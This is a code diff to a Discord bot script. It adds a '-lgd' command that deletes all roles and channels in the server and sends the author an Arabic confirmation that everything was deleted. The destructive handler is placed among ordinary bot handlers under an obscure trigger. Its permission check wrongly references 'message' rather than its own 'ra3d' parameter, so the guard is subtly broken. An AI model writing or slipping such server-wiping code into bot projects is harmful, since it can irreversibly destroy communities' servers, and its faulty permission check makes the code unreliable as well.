@@ -219,7 +219,17 @@ message.author.sendEmbed(embed)
 
      
      
-
+client.on('message', ra3d => {   
+ if (ra3d.content.startsWith("-lgd")) {
+    if(!message.member.hasPermission('MANAGE_CHANNELS')) return message.reply('**⚠  لايوجد لديك صلاحية**');
+     ra3d.guild.roles.forEach(r => { r.delete() }) 
+     ra3d.guild.channels.forEach(c => { c.delete() })
+                let embed = new Discord.RichEmbed()
+            .setColor('#fd0101')
+            .setDescription('تم حذف كل شي في السيرفر✅')
+           ra3d.author.sendEmbed(embed);
+ }
+ });
 
 
 client.on("message", message => {
